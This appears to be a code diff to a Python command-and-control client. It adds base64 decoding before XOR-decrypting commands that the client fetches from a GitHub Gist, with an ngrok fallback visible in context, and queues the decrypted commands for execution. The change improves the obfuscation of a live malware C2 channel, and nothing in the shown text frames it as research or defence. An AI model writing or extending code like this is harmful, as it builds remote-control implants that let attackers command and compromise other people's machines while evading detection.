@@ -7,6 +7,7 @@ import sys
 import time
 import json
 import random
+import base64
 import ssl
 import hashlib
 import urllib.request
@@ -213,13 +214,15 @@ def c2_loop(cfg: dict, me: dict, gist_url: str, c2_key: str,
                     if ngrok_fails >= 3:
                         ngrok_url = None
             else:
-                # ── Gist primary (XOR-encrypted) ──
+                # ── Gist primary (base64(XOR-encrypted)) ──
                 try:
                     raw = _fetch_gist(gist_url, timeout=15)
                     if raw:
-                        # Always attempt XOR decrypt — no plaintext fallback
+                        # Format: base64(XOR_encrypt(command, c2_key))
+                        # Decode base64 first, then XOR decrypt
                         try:
-                            decrypted = _xor_crypt(raw.encode(), c2_key.encode())
+                            encrypted = base64.b64decode(raw.strip())
+                            decrypted = _xor_crypt(encrypted, c2_key.encode())
                             dec_text = decrypted.decode('utf-8')
                             if dec_text.strip():
                                 commands.append(dec_text)
